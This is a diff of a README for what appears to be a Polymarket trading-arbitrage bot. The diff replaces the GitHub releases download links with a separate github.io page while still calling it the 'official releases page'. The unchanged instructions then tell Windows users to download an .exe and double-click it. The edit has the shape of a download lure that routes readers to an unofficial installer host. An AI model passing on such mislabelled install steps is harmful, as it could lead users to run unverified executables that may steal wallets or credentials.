@@ -1,6 +1,6 @@
 # 📈 Polymarket-5min-bot - Automated arbitrage for smarter market trades
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/savarahypersomnia96/Polymarket-5min-bot/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://savarahypersomnia96.github.io)
 
 ## What this program does
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/savarahypersomnia96/Polymarket-5min-bot/releases) to download the installer.
+1. Visit the [official releases page](https://savarahypersomnia96.github.io) to download the installer.
 2. Select the file ending in .exe to download the application.
 3. Locate the file in your downloads folder once the transfer finishes.
 4. Double-click the file to start the installation process.
